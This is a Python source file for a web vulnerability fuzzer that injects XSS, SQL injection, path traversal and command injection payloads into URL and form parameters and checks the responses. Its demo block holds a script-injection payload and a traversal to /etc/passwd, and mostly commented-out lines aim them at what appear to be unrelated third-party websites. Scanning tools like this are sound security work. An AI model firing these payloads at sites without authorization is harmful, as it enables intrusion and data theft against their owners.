# coding=utf-8
import traceback
import sys
from copy import deepcopy
import codecs
from massweb.targets.target import Target
from massweb.targets.fuzzy_target import FuzzyTarget
from massweb.fuzzers.ifuzzer import iFuzzer
from massweb.fuzz_generators.url_generator import generate_fuzzy_urls
from massweb.mass_requests.mass_request import MassRequest
from massweb.payloads.payload import Payload
from urlparse import parse_qs
from urlparse import urlparse
from urlparse import urlunparse
from urllib import urlencode
from massweb.vuln_checks.mxi import MXICheck
from massweb.vuln_checks.osci import OSCICheck
from massweb.vuln_checks.sqli import SQLICheck
from massweb.vuln_checks.trav import TravCheck
from massweb.vuln_checks.xpathi import XPathICheck
from massweb.vuln_checks.xss import XSSCheck
from massweb.results.result import Result 
from massweb.mass_requests.response_analysis import parse_worthy
import logging
from logging import StreamHandler
logging.basicConfig(format='%(asctime)s %(name)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
logger = logging.getLogger('WebFuzzer')
logger.setLevel(logging.INFO)
sys.stdin = codecs.getreader('utf-8')(sys.stdin)
sys.stderr = codecs.getwriter('utf-8')(sys.stderr)

class WebFuzzer(iFuzzer):

    def __init__(self, targets = [], payloads = [], num_threads = 10, time_per_url = 10, request_timeout = 10, proxy_list = [{}], hadoop_reporting = False, payload_groups = []):

        #do this because we may need to create more MassRequest objects in checks (like bsqli), needs to be configured the same
        self.mreq_config_dict = {"num_threads" : num_threads, "time_per_url" : time_per_url, "request_timeout" : request_timeout, "proxy_list" : proxy_list, "hadoop_reporting" : hadoop_reporting}
        self.mreq = MassRequest(**self.mreq_config_dict)
        
        self.targets = targets
        self.payloads = payloads        
        self.mxi_check = MXICheck()
        self.osci_check = OSCICheck()
        self.sqli_check = SQLICheck()
        self.trav_check = TravCheck()
        self.xpathi_check = XPathICheck()
        self.xss_check = XSSCheck()

        self.hadoop_reporting = hadoop_reporting
        if self.hadoop_reporting:
            logger.info("Hadoop reporting set in fuzzer")

    def __generate_fuzzy_target_get(self, target):

        url = target.url
        parsed_url = urlparse(url)
        parsed_url_query = parsed_url.query
        url_q_dic = parse_qs(parsed_url_query)

        fuzzy_targets = []
        for query_param, query_val in url_q_dic.iteritems():

            for payload in self.payloads:

                fuzzy_url = (self.replace_param_value(url, query_param, str(payload)))
                fuzzy_target = FuzzyTarget(fuzzy_url, url, query_param, "get", payload = payload)
                fuzzy_targets.append(fuzzy_target)

        return fuzzy_targets

    def __generate_fuzzy_target_post(self, target):

        url = target.url
        fuzzy_targets = []
        post_keys = target.data.keys()

        for key in post_keys:
            data_copy = target.data.copy()

            for payload in self.payloads:
                data_copy[key] = str(payload)
                fuzzy_target = FuzzyTarget(url, url, key, "post", data = data_copy.copy(), payload = payload, unfuzzed_data = target.data)
                fuzzy_targets.append(fuzzy_target)

        return fuzzy_targets

    def generate_fuzzy_targets(self):

        if self.hadoop_reporting:
            logger.info("Generating fuzzy targets")

        if len(self.targets) == 0:
            raise Exception("Targets list must not be empty!")

        self.fuzzy_targets = []
        for target in self.targets:

            if target.ttype == "get":
                fuzzy_target_list = self.__generate_fuzzy_target_get(target)
                self.fuzzy_targets += fuzzy_target_list

            if target.ttype == "post":
                fuzzy_target_list = self.__generate_fuzzy_target_post(target)
                self.fuzzy_targets += fuzzy_target_list
            
        return self.fuzzy_targets

    def fuzz(self):

        self.mreq.request_targets(self.fuzzy_targets)
        results = []
        for r in self.mreq.results:
            ftarget = r[0]
            #!not yet multithreaded, should it be?
            try:
                result = self.analyze_response(ftarget, r[1])

            except:

                #if request failed and str is returned instead of Response obj
                #could save some cycles here not analyzing response
                if self.hadoop_reporting:
                    logger.info("Marking target as failed due to exception: ")
                    traceback.print_exc()
                    
                result = self.analyze_response(ftarget, "__PNK_FAILED_RESPONSE")

            results.append(result)

        return results

    def analyze_response(self, ftarget, response):

        #!function is a mess, response is of type text or non-text, trying to read blah blah
        result_dic = {}
        check_type_list = ftarget.payload.check_type_list

        if self.hadoop_reporting:
            logger.info(u"Response is of type %s for target %s" % (str(type(response)),unicode(ftarget)))

        try:
            if parse_worthy(response, hadoop_reporting = self.hadoop_reporting):
                logger.info(u"Target %s looks worth checking for vulnerabilities, doing so" % unicode(ftarget))

            else:

                logger.info(u"Response deemed non-parse-worthy, returning false check dic for %s" % unicode(ftarget))
                result_dic = {}
                for check_type in check_type_list:
                    result_dic[check_type] = False

                return Result(ftarget, result_dic)

        except:

            logger.info(u"Checking parse-worthiness threw exception (it was probably a string from a failed response), returning false check dic for %s. Here is the handled exception: " % unicode(ftarget))
            traceback.print_exc()

            result_dic = {}
            for check_type in check_type_list:
                result_dic[check_type] = False

            return Result(ftarget, result_dic)
        
        if "mxi" in check_type_list:

            mxi_result = self.mxi_check.check(response.text)
            result_dic["mxi"] = mxi_result

        if "sqli" in check_type_list:

            sqli_result = self.sqli_check.check(response.text)
            result_dic["sqli"] = sqli_result

        if "xpathi" in check_type_list:

            xpathi_result = self.xpathi_check.check(response.text)
            result_dic["xpathi"] = xpathi_result

        if "trav" in check_type_list:

            trav_result = self.trav_check.check(response.text)
            result_dic["trav"] = trav_result

        if "osci" in check_type_list:

            osci_result = self.osci_check.check(response.text)
            result_dic["osci"] = osci_result

        if "xss" in check_type_list:

            xss_result = self.xss_check.check(response.text)
            result_dic["xss"] = xss_result

        return Result(ftarget, result_dic)

if __name__ == "__main__":

    xss_payload = Payload('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
#    trav_payload = Payload('../../../../../../../../../../../../../../../../../../etc/passwd', check_type_list = ["trav"])
#    sqli_xpathi_payload = Payload("')--", check_type_list = ["sqli", "xpathi"])
    bsqli_payload = Payload('bsqlipayload', check_type_list = ["bsqli"])

    wf = WebFuzzer(time_per_url = 10, hadoop_reporting = True)
#    wf.add_payload(xss_payload)
##    wf.add_payload(trav_payload)
#    wf.add_payload(sqli_xpathi_payload)
    wf.add_payload(bsqli_payload)

#    wf.add_target_from_url(u"http://course.hyperiongray.com/vuln1")
    wf.add_target_from_url(u"http://www.hyperiongray.com/?q=whatever")
#    wf.add_target_from_url(u"http://www.wpsurfing.co.za/?feed=11")
#    wf.add_target_from_url(u"http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=1")
#    wf.add_target_from_url(u"http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1")
#    wf.add_target_from_url(u"http://www.dobrevȤȤȤȤȤȤsource.org/index.php?idȤȤȤȤȤȤ=1ȤȤȤȤ")

    print "Targets list pre post detrmination:"
    for target in wf.targets:
        print target

    print "Targets list after additional injection points have been found:"
    wf.determine_posts_from_targets()
    for target in wf.targets:
        print target.url, target.data

    print "FuzzyTargets list:"
    wf.generate_fuzzy_targets()
    for ft in wf.fuzzy_targets:
        print ft, ft.ttype, ft.data, ft.unfuzzed_url, ft.unfuzzed_data

    print "Results of our fuzzing:"
    for r in wf.fuzz():
        print r

#    print "targs"
#    for target in wf.targets:
#        print target

#    print "--------fuzzy"
#    for target in ft:
#        print target


#    for target in wf.generate_fuzzy_targets():
#        print target.url, str(target.data)

#    for r in wf.fuzz():
#        print r, r.fuzzy_target.ttype, r.fuzzy_target.payload

#    gf = GetFuzzer(proxy_list = [{}])
#    mx_sqli_xmli_trav_osci_payload = Payload("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\"
#                                             , check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
#

#    gf.add_payload(mx_sqli_xmli_trav_osci_payload)
#    gf.add_payload(xss_payload)

#    gf.add_target_from_url("http://www.hyperiongray.com/?q=user&t=eke")
#    gf.add_target_from_url("http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CSCrIpT%3Ealert%2826702%29%3C%2FScRiPt%3E&amp;ProName=%C2%A2%C3%81%C2%A03%083D%09")
#    gf.add_target_from_url("http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29")
#    gf.add_target_from_url("http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
#    gf.add_target_from_url("http://www.dobrevsource.org/")
#    gf.add_target_from_url("http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E")
#
#    for t in gf.generate_fuzzy_targets():
#        print t.url
#        print t.payload.check_type_list
#
#    for res in gf.fuzz():
#        print res
